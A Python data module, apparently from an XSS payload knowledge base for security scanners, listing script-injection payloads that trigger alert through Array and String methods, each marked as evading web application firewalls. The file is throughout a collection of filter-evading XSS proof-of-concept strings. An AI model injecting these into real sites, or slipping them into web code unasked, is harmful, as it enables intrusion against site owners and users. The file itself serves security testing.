#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

JavaScript Method Payloads
"""

from ..models import PayloadEntry


ARRAY_METHOD_PAYLOADS = {
    "arr_map": PayloadEntry(
        payload="<script>[1].map(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.map with alert",
        tags=["array", "map"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_filter": PayloadEntry(
        payload="<script>[1].filter(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.filter with alert",
        tags=["array", "filter"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_find": PayloadEntry(
        payload="<script>[1].find(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.find with alert",
        tags=["array", "find"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_findIndex": PayloadEntry(
        payload="<script>[1].findIndex(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.findIndex with alert",
        tags=["array", "findIndex"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_forEach": PayloadEntry(
        payload="<script>[1].forEach(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.forEach with alert",
        tags=["array", "forEach"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_some": PayloadEntry(
        payload="<script>[1].some(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.some with alert",
        tags=["array", "some"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_every": PayloadEntry(
        payload="<script>[1].every(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.every with alert",
        tags=["array", "every"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_reduce": PayloadEntry(
        payload="<script>[,1].reduce(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.reduce with alert",
        tags=["array", "reduce"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_reduceRight": PayloadEntry(
        payload="<script>[,1].reduceRight(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.reduceRight with alert",
        tags=["array", "reduceRight"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_sort": PayloadEntry(
        payload="<script>[1,2].sort(()=>alert(1))</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.sort with alert",
        tags=["array", "sort"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_flatMap": PayloadEntry(
        payload="<script>[1].flatMap(alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.flatMap with alert",
        tags=["array", "flatMap"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_from": PayloadEntry(
        payload="<script>Array.from([1],alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.from with mapFn",
        tags=["array", "from"],
        waf_evasion=True,
        reliability="high",
    ),
    "arr_of_constructor": PayloadEntry(
        payload="<script>Array.of.call(alert,1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Array.of.call",
        tags=["array", "of", "call"],
        waf_evasion=True,
        reliability="medium",
    ),
}

STRING_METHOD_PAYLOADS = {
    "str_replace": PayloadEntry(
        payload="<script>'x'.replace(/x/,alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="String.replace with function",
        tags=["string", "replace"],
        waf_evasion=True,
        reliability="high",
    ),
    "str_replaceAll": PayloadEntry(
        payload="<script>'x'.replaceAll(/x/g,alert)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="String.replaceAll with function",
        tags=["string", "replaceAll"],
        waf_evasion=True,
        reliability="high",
    ),
    "str_split": PayloadEntry(
        payload="<script>'x'.split({[Symbol.split]:alert})</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="String.split with Symbol.split",
        tags=["string", "split", "symbol"],
        waf_evasion=True,
        reliability="high",
    ),
    "str_match": PayloadEntry(
        payload="<script>'x'.match({[Symbol.match]:alert})</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="String.match with Symbol.match",
        tags=["string", "match", "symbol"],
        waf_evasion=True,
        reliability="high",
    ),
    "str_search": PayloadEntry(
        payload="<script>'x'.search({[Symbol.search]:alert})</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="String.search with Symbol.search",
        tags=["string", "search", "symbol"],
        waf_evasion=True,
        reliability="high",
    ),
}

# Combined database
JS_METHODS_DATABASE = {
    **ARRAY_METHOD_PAYLOADS,
    **STRING_METHOD_PAYLOADS,
}
JS_METHODS_TOTAL = len(JS_METHODS_DATABASE)
